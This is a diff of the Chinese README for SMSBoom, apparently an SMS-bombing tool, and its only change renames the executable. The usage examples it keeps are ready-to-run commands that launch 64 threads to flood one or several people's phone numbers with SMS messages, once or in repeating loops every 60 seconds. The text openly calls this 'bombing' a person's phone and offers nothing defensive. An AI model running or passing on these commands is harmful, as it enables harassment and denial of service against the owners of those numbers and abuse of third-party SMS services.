@@ -37,7 +37,7 @@
 
    5. 使用前必须更新一遍最新接口
     ```shell
-    smsboom_install.exe update
+    smsboom_pyinstall.exe update
     ```  
     > 若更新接口出现错误 `ssl_`,请参见 [issue](https://github.com/AdminWhaleFall/SMSBoom/issues/2) **关闭代理软件**再 update.
 
@@ -45,19 +45,19 @@
 
     启动64个线程,轰炸一个人的手机号(198xxxxxxxx),只轰炸一波。
    ```shell
-   smsboom_install.exe run -t 64 -p 198xxxxxxxxx
+   smsboom_pyinstall.exe run -t 64 -p 198xxxxxxxxx
    ```
 
    启动64个线程,轰炸多个人的手机号(19xxxxxxx),启动循环轰炸，每个循环间隔60秒  
 
    ```shell
-   smsboom_install.exe run -t 64 -p 198xxxxxxxxx -s -i 60
+   smsboom_pyinstall.exe run -t 64 -p 198xxxxxxxxx -s -i 60
    ```
 
    启动64个线程,轰炸多个人的手机号(138xxx,139xxxx),启动循环轰炸,每个循环间隔60秒。  
 
    ```shell
-   smsboom_install.exe run -t 64 -p 138xxxxxxxx -p 139xxxxxxxx -s -i 60
+   smsboom_pyinstall.exe run -t 64 -p 138xxxxxxxx -p 139xxxxxxxx -s -i 60
    ```
 
 
